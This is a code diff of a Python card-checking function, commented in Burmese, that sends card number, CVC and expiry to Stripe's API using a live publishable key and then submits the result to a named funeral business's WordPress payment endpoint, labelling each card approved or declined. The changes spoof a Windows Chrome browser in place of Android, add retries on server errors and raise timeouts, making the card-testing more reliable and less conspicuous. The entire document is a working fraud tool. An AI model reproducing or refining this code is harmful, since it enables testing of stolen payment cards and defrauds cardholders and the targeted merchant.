@@ -37,9 +37,14 @@ def Tele(ccx):
         random_name = ''.join(random.choice(letters) for i in range(10))
         random_email = f"{random_name}@gmail.com"
 
-        # 🔥 RETRY SYSTEM
+        # 🔥 RETRY SYSTEM UPGRADE (Connection ငြိမ်အောင်)
         session = requests.Session()
-        retry = Retry(connect=3, backoff_factor=0.5)
+        # Total=5 ခါကြိုးစားမယ်, 500/502/503/504 error တွေကို auto retry လုပ်မယ်
+        retry = Retry(
+            total=5, 
+            backoff_factor=1, 
+            status_forcelist=[500, 502, 503, 504]
+        )
         adapter = HTTPAdapter(max_retries=retry)
         session.mount('http://', adapter)
         session.mount('https://', adapter)
@@ -55,23 +60,24 @@ def Tele(ccx):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            # 🔥 User-Agent ကို PC (Windows 10) ပြောင်းလိုက်ပြီ
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'sec-ch-ua-mobile': '?0',  # Mobile မဟုတ်ကြောင်း (?0)
+            'sec-ch-ua-platform': '"Windows"', # Platform Windows
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
         
         data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
         
-        # Proxy အလုပ်လုပ်အောင် session.post သုံးရမယ်
+        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
         response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=headers,
             data=data,
-            timeout=40 
+            timeout=60 
         )
 
         if 'id' not in response.json():
@@ -92,11 +98,12 @@ def Tele(ccx):
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            # 🔥 Step 2 မှာလည်း User-Agent ကို Windows နဲ့ ညီအောင်ညှိပေးထားတယ်
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
         }
 
         data = {
@@ -116,11 +123,12 @@ def Tele(ccx):
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
+        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
         response = session.post(
             'https://brendanennisfunerals.ie/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
-            timeout=40
+            timeout=60
         )
         
         try:
@@ -132,7 +140,7 @@ def Tele(ccx):
                 result = "Decline⛔"
 
     except Exception as e:
-        # ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
+        # ၅ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
         result = f"Connection Failed (Retry Limit) ⚠️"
         
     return result
